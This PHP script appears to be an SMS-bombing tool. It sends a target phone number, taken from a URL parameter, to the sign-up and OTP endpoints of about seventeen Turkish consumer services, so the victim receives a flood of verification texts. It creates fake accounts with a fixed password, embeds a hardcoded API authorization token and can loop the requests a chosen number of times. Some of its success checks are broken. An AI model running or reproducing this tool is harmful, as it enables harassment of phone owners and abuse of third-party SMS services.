<?php

$adet = isset($_GET['adet']) ? intval($_GET['adet']) : 1;

error_reporting(0);

function generateRandomEmail()
{
    $email = substr(str_shuffle(str_repeat($x = 'abcdefghijklmnopqrstuvwxyz', ceil(20 / strlen($x)))) , 1, 20) . '@example.com';
    return $email;
}

function KahveDunyasi($gsm)
{
    $url = "https://core.kahvedunyasi.com/api/users/sms/send";
    $data = array(
        "mobile_number" => $gsm,
        "token_type" => "register_token"
    );
    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $response = json_decode($result, true);

    if (isset($response["meta"]["messages"]["error"]) && count($response["meta"]["messages"]["error"]) == 0)
    {
        echo "[+] Başarılı! --> core.kahvedunyasi.com" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> core.kahvedunyasi.com" . '<p>';
    }
}

function NaosStars($mail, $gsm)
{
    $url = "https://shop.naosstars.com/users/register/";
    $data = array(
        "email" => $mail,
        "first_name" => "Memati",
        "last_name" => "Bas",
        "password" => "31ABC..abc31",
        "date_of_birth" => "1975-12-31",
        "phone" => "0" . $gsm,
        "gender" => "male",
        "kvkk" => "true",
        "contact" => "true",
        "confirm" => "true"
    );
 
    $curl = curl_init();
 
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => http_build_query($data) ,
        CURLOPT_HTTPHEADER => array(
            "Content-Type: application/x-www-form-urlencoded"
        ) ,
    ));
 
    $response = curl_exec($curl);
    $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
 
    if ($httpcode == 202)
    {
        echo "[+] Başarılı! --> shop.naosstars.com" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> shop.naosstars.com" . '<p>';
    }
}
 
function Wmf($mail, $gsm)
{
    $url = "https://www.wmf.com.tr/users/register/";
    $data = array(
        "confirm" => "true",
        "date_of_birth" => "1956-03-01",
        "email" => $mail,
        "email_allowed" => "true",
        "first_name" => "Memati",
        "gender" => "male",
        "last_name" => "Bas",
        "password" => "31ABC..abc31",
        "phone" => "0" . $gsm
    );
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    if (strpos($result, "Hata") === false)
    {
        echo "[+] Başarılı! --> wmf.com.tr" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> wmf.com.tr" . '<p>';
    }
}
 
function Bim($gsm)
{
    try
    {
        $url = "https://bim.veesk.net:443/service/v1.0/account/login";
        $data = array(
            "phone" => $gsm
        );
        $options = array(
            "http" => array(
                "header" => "Content-type: application/json",
                "method" => "POST",
                "content" => json_encode($data) ,
                "ignore_errors" => true
            ) ,
            "ssl" => array(
                "verify_peer" => false,
                "verify_peer_name" => false
            )
        );
        $context = stream_context_create($options);
        $bim = file_get_contents($url, false, $context);
        if ($http_response_header[0] == "HTTP/1.1 200 OK")
        {
            echo "[+]Başarılı! --> bim.veesk.net" . '<p>';
        }
        else
        {
            throw new Exception();
        }
    }
    catch(Exception $e)
    {
        echo "[-]Başarısız! --> bim.veesk.net" . '<p>';
    }
}
 
function Sok($gsm)
{
    try
    {
        $json = json_encode(array(
            "mobile_number" => $gsm,
            "token_type" => "register_token"
        ));
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ceptesok.com:443/api/users/sendsms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
        $headers = array();
        $headers[] = "Content-Type: application/json";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $response = json_decode($result, true);
        if (count($response["meta"]["messages"]["success"]) != 0)
        {
            echo "[+]Başarılı! --> api.ceptesok.com" . '<p>';
        }
        else
        {
            throw new Exception();
        }
    }
    catch(Exception $e)
    {
        echo "[-]Başarısız! --> api.ceptesok.com" . '<p>';
    }
}
 
function Tiklagelsin($gsm)
{
    $data = array(
        "operationName" => "GENERATE_OTP",
        "query" => "mutation GENERATE_OTP(\$phone: String, \$challenge: String, \$deviceUniqueId: String) {
            generateOtp(phone: \$phone, challenge: \$challenge, deviceUniqueId: \$deviceUniqueId)
        }",
        "variables" => array(
            "challenge" => "f2523023-283e-46be-b8db-c08f27d3e21c",
            "deviceUniqueId" => "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3",
            "phone" => $gsm
        )
    );
 
    $data_string = json_encode($data);
 
    $ch = curl_init('https://svc.apps.tiklagelsin.com:443/user/graphql');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Content-Length: ' . strlen($data_string)
    ));
 
    $result = curl_exec($ch);
 
    if (json_decode($result)
        ->data->generateOtp == true)
    {
        echo "[+]Başarılı! --> svc.apps.tiklagelsin.com" . '<p>';
    }
    else
    {
        echo "[-]Başarısız! --> svc.apps.tiklagelsin.com" . '<p>';
    }
}
 
function Englishhome($mail, $gsm)
{
    $data = array(
        "first_name" => "Memati",
        "last_name" => "Bas",
        "email" => $mail,
        "phone" => "0" . $gsm,
        "password" => "31ABC..abc31",
        "email_allowed" => "true",
        "sms_allowed" => "true",
        "confirm" => "true",
        "tom_pay_allowed" => "true"
    );
 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.englishhome.com:443/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $home = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
 
    if ($httpcode == 202)
    {
        echo "[+]Başarılı! --> englishhome.com" . '<p>';
    }
    else
    {
        echo "[-]Başarısız! --> englishhome.com" . '<p>';
    }
}
 
function Watsons($gsm)
{
    $url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR";
    $headers = array(
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept: application/json",
        "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding: gzip, deflate",
        "Referer: https://www.watsons.com.tr/register",
        "Content-Type: application/json;charset=UTF-8",
        "X-Dtpc: 11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0",
        "Origin: https://www.watsons.com.tr",
        "Dnt: 1",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Site: same-origin",
        "Pragma: no-cache",
        "Cache-Control: no-cache",
        "Te: trailers"
    );
    $data = array(
        "countryCode" => "TR",
        "phoneNumber" => $gsm
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpcode == 201)
    {
        echo "[+]Başarılı! --> watsons.com.tr" . '<p>';
    }
    else
    {
        echo "[-]Başarısız! --> watsons.com.tr" . '<p>';
    }
}
 
function Suiste($gsm)
{
    $url = "https://suiste.com:443/api/auth/code";
    $headers = array(
        "Accept: application/json",
        "Content-Type: application/x-www-form-urlencoded; charset=utf-8",
        "User-Agent: suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2",
        "Accept-Language: tr",
        "Accept-Encoding: gzip, deflate"
    );
    $data = "action=register&gsm=" . $gsm;
 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
 
    $response_json = json_decode($response, true);
    if ($http_code == 200 && $response_json["code"] == "common.success")
    {
        echo "[+]Başarılı! --> suiste.com" . '<p>';
    }
    else
    {
        echo "[-]Başarısız! --> suiste.com" . '<p>';
    }
}
 
function Hayat($gsm)
{
    try
    {
        $url = "https://www.hayatsu.com.tr:443/api/signup/otpsend";
        $data = array(
            "mobilePhoneNumber" => $gsm
        );
        $options = array(
            'http' => array(
                'header' => "Content-type: application/json\r\n",
                'method' => 'POST',
                'content' => json_encode($data) ,
            ) ,
        );
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        $response = json_decode($result, true);
        if (isset($response["IsSuccessful"]) && $response["IsSuccessful"] == true)
        {
            echo "[+] Başarılı! --> hayatsu.com.tr" . '<p>';
        }
        else
        {
            throw new Exception();
        }
    }
    catch(Exception $e)
    {
        echo "[-] Başarısız! --> hayatsu.com.tr" . '<p>';
    }
}
 
function Hey($gsm)
{
    $url = "https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=" . $gsm;
    $headers = array(
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "Accept-Encoding: gzip, deflate",
        "User-Agent: HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0",
        "Accept-Language: tr"
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($response, true);
    if (isset($json["IsSuccess"]) && $json["IsSuccess"] == true)
    {
        echo "[+] Başarılı! --> heyapi.heymobility.tech" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> heyapi.heymobility.tech" . '<p>';
    }
}
 
function Joker($gsm)
{
    $url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms";
    $headers = array(
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding: gzip, deflate",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With: XMLHttpRequest"
    );
    $data = http_build_query(array(
        "phone" => $gsm
    ));
    $options = array(
        "http" => array(
            "header" => implode("\r\n", $headers) ,
            "method" => "POST",
            "content" => $data
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $response = json_decode($result, true);
    if (isset($response["success"]) && $response["success"] == true)
    {
        echo "[+] Başarılı! --> joker.com.tr" . '<p>';
    }
    else
    {
        echo "[+] Başarılı! --> joker.com.tr" . '<p>';
    }
}
 
function Pisir($gsm)
{
    $url = "https://api.pisir.com:443/v1/login/";
    $data = array(
        "app_build" => "343",
        "app_platform" => "ios",
        "msisdn" => $gsm
    );
    $options = array(
        'http' => array(
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data) ,
        ) ,
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $response = json_decode($result, true);
    if (isset($response["ok"]) && $response["ok"] == "1")
    {
        echo "[+] Başarılı! --> api.pisir.com" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> api.pisir.com" . '<p>';
    }
}
 
function KimGb($gsm)
{
    $url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp";
    $data = array(
        "msisdn" => "90" . $gsm
    );
    $options = array(
        'http' => array(
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data) ,
        ) ,
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $response = json_decode($result, true);
    if (isset($response["status"]) && $response["status"] == "ok")
    {
        echo "[+] Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com" . '<p>';
    }
    else
    {
        echo "[+] Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com" . '<p>';
    }
}
 
function Tazi($gsm)
{
    $url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin";
    $headers = array(
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json;charset=utf-8",
        "Accept-Encoding: gzip, deflate",
        "User-Agent: Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0",
        "Accept-Language: tr-TR,tr;q=0.9",
        "Authorization: Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
    );
    $json = array(
        "cep_tel" => $gsm,
        "cep_tel_ulkekod" => "90"
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $json_response = json_decode($response, true);
    if ($json_response["kod"] == "0000")
    {
        echo "[+]Başarılı! --> mobileapiv2.tazi.tech" . '<p>';
    }
    else
    {
        echo "[-]Başarısız! --> mobileapiv2.tazi.tech" . '<p>';
    }
}
 
function Hop($gsm)
{
    $url = "https://api.hoplagit.com:443/v1/auth:reqSMS";
    $data = array(
        "phone" => "+90" . $gsm
    );
    $options = array(
        'http' => array(
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data) ,
        ) ,
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $response = json_decode($result, true);
    if ($response && $response["status"] == "ok")
    {
        echo "[+] Başarılı! --> api.hoplagit.com" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> api.hoplagit.com" . '<p>';
    }
}
 
function Marti($gsm)
{
    $url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin";
    $data = array(
        "mobilePhone" => $gsm,
        "mobilePhoneCountryCode" => "90",
        "oneSignalId" => ""
    );
    $options = array(
        'http' => array(
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data) ,
        ) ,
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $response = json_decode($result, true);
    if ($response && $response["isSuccess"] == true)
    {
        echo "[+] Başarılı! --> customer.martiscooter.com" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> customer.martiscooter.com" . '<p>';
    }
}

function Buludag($gsm)
{
    $url = "https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon=" . $gsm;
    $result = file_get_contents($url);
    if ($httpCode == 200)
    {
        echo "[+] Başarılı! --> bilet.balikesiruludag.com.tr" . '<p>';
    }
    else
    {
        echo "[-] Başarısız! --> bilet.balikesiruludag.com.tr" . '<p>';
    }
}
 
if (isset($_GET['gsm']))
{
    $gsm = $_GET['gsm'];
    $mail = generateRandomEmail();
 
    KahveDunyasi($gsm);
    NaosStars($mail, $gsm);
    Wmf($mail, $gsm);
    Bim($gsm);
    Sok($gsm);
    Tiklagelsin($gsm);
    Englishhome($mail, $gsm);
    Watsons($gsm);
    Hayat($gsm);
    Hey($gsm);
    Joker($gsm);
    Pisir($gsm);
    KimGb($gsm);
    Tazi($gsm);
    hop($gsm);
    Marti($gsm);
    Buludag($gsm);
 
}

if (isset($_GET['gsm'])) {
    $gsm = $_GET['gsm'];
    $mail = generateRandomEmail();

    for ($i = 1; $i <= $adet; $i++) {
        KahveDunyasi($gsm);
    }
} else {
    echo "Lütfen gsm giriniz /main.php?gsm=$gsm";
}
?>
